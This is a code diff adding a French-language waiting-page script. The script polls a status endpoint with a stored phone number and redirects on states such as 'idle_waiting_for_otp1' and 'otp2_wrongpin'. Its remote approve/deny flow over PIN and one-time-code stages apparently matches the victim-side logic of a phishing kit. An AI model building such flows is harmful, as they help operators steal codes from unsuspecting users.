@@ -1,0 +1,33 @@
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+        const phone = localStorage.getItem('phone');
+
+        const pollInterval = setInterval(async () => {
+            try {
+                if (phone) {
+                    const res = await fetch('/api/check-status?phone=' + encodeURIComponent(phone));
+                    if (res.ok) {
+                        const data = await res.json();
+                        
+                        if (data.status === 'approved' || data.status === 'idle_waiting_for_otp1') {
+                            clearInterval(pollInterval);
+                            window.location.href = "page7.html";
+                        } else if (data.status === 'denied' || data.status === 'otp2_wrongpin') {
+                            clearInterval(pollInterval);
+                            alert("Code PIN incorrect ou refusé. Veuillez réessayer.");
+                            window.location.href = "page5.html";
+                        }
+                    }
+                }
+            } catch (e) {
+                console.log("Checking status...");
+            }
+        }, 3000);
+
+        // Fallback transition after 8 seconds if no action taken
+        setTimeout(() => {
+            clearInterval(pollInterval);
+            window.location.href = "page7.html";
+        }, 8000);
+    });
+</script>
